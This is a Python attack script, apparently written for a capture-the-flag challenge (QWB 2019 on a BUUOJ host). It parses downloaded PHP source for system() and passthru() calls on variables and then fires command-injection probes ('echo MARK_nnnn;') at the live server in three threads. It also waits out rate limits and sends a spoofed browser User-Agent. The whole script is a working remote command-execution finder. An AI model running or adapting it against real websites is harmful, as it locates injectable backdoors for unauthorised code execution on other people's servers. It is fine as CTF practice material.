#!/usr/bin/env python3
"""
Optimized backdoor scanner - multithreaded with rate limiting
Only tests system() and passthru() calls with parameters
"""
import os
import re
import requests
import time
import threading
from queue import Queue
from urllib.parse import urljoin, urlencode

BASE_URL = "http://ea1225ef-4ad1-4818-b4bc-4812aec70cf7.node5.buuoj.cn:81"
WWW_ROOT = "/home/kali/workspace/challenges/154_强网杯_2019_高明的黑客/www.tar.gz_files"
DELAY = 0.3  # per-thread delay
THREADS = 3
MARKER_PREFIX = "MARK"

session = requests.Session()
session.headers.update({
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
})

# Thread-safe results
results_lock = threading.Lock()
found_backdoors = []
tested_count = 0

def extract_system_passthru_params(content, filepath):
    """Extract only system() and passthru() calls with variable parameters"""
    targets = []

    # Pattern for system($var) or system("...$var...")
    system_patterns = [
        r'system\s*\(\s*\$([a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*)\s*\)',
        r'system\s*\(\s*["\'][^"\']*\$([a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*)[^"\']*["\']\s*\)',
    ]

    # Pattern for passthru($var) or passthru("...$var...")
    passthru_patterns = [
        r'passthru\s*\(\s*\$([a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*)\s*\)',
        r'passthru\s*\(\s*["\'][^"\']*\$([a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*)[^"\']*["\']\s*\)',
    ]

    all_patterns = system_patterns + passthru_patterns

    for pattern in all_patterns:
        for match in re.finditer(pattern, content):
            param_name = match.group(1)
            targets.append(param_name)

    return list(set(targets))  # unique params

def scan_php_files():
    """Scan all PHP files and extract testable params"""
    test_cases = []

    for root, dirs, files in os.walk(WWW_ROOT):
        for filename in files:
            if filename.endswith('.php'):
                filepath = os.path.join(root, filename)
                rel_path = os.path.relpath(filepath, WWW_ROOT)

                try:
                    with open(filepath, 'r', errors='ignore') as f:
                        content = f.read()
                except:
                    continue

                params = extract_system_passthru_params(content, filepath)

                for param in params:
                    test_cases.append({
                        'file': rel_path,
                        'param': param,
                        'marker': f"{MARKER_PREFIX}_{len(test_cases):04d}"
                    })

    return test_cases

def worker(queue):
    """Worker thread"""
    global tested_count

    while True:
        item = queue.get()
        if item is None:
            break

        url = urljoin(BASE_URL, item['file'])
        marker = item['marker']
        param = item['param']

        # Test with echo marker
        payload = f"echo {marker};"
        test_url = f"{url}?{param}={payload}"

        try:
            time.sleep(DELAY)  # Rate limiting
            r = session.get(test_url, timeout=10)

            if r.status_code == 429:
                print(f"[429] Rate limited, waiting 30s...")
                time.sleep(30)
                # Re-queue this item
                queue.put(item)
                continue

            if marker in r.text:
                with results_lock:
                    found_backdoors.append({
                        'file': item['file'],
                        'param': param,
                        'url': test_url
                    })
                    print(f"\n[FOUND] {item['file']} ?{param}=  responds to marker!")

            with results_lock:
                tested_count += 1
                if tested_count % 100 == 0:
                    print(f"[PROGRESS] Tested {tested_count} cases...")

        except Exception as e:
            pass

        queue.task_done()

def main():
    print("[*] Scanning PHP files for system()/passthru() calls...")
    test_cases = scan_php_files()
    print(f"[*] Found {len(test_cases)} test cases (system/passthru with params)")

    if not test_cases:
        print("[!] No test cases found!")
        return

    print(f"[*] Starting {THREADS} threads with {DELAY}s delay per request")
    print(f"[*] Estimated time: {len(test_cases) * DELAY / THREADS / 60:.1f} minutes")

    queue = Queue()
    for tc in test_cases:
        queue.put(tc)

    threads = []
    for i in range(THREADS):
        t = threading.Thread(target=worker, args=(queue,))
        t.start()
        threads.append(t)

    queue.join()

    for i in range(THREADS):
        queue.put(None)
    for t in threads:
        t.join()

    print(f"\n[*] Complete! Tested {tested_count} cases")
    print(f"[*] Found {len(found_backdoors)} potential backdoors:")

    for b in found_backdoors:
        print(f"  {b['file']} ?{b['param']}=")

if __name__ == "__main__":
    main()
